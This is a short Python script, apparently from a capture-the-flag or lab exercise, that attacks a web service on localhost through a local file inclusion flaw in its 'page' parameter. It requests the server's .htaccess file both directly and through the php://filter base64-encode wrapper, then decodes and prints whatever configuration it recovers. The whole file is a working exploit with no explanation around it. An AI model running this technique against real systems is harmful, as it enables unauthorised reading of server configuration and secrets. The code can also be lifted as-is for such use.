import requests, base64, re
try:
  r=requests.get("http://127.0.0.1:33154/?page=.htaccess",timeout=10)
  print("Status:",r.status_code)
  if "RewriteEngine" in r.text:
    print("DIRECT ACCESS:",r.text[:500])
  else:
    b=re.findall(r'[A-Za-z0-9+/]{40,}={0,2}',r.text)
    if b:
      for m in b:
        d=base64.b64decode(m).decode('utf-8',errors='ignore')
        if "RewriteEngine" in d:
          print("BASE64 CONTENT:",d)
except Exception as e:
  print("Error:",e)

try:
  r=requests.get("http://127.0.0.1:33154/?page=php://filter/convert.base64-encode/resource=.htaccess",timeout=10)
  print("\nFILTER Status:",r.status_code)
  b=re.findall(r'[A-Za-z0-9+/]{40,}={0,2}',r.text)
  if b:
    for m in b:
      d=base64.b64decode(m).decode('utf-8',errors='ignore')
      if "SetEnv" in d or "Rewrite" in d:
        print("FILTER DECODED:",d)
except Exception as e:
  print("Filter error:",e)
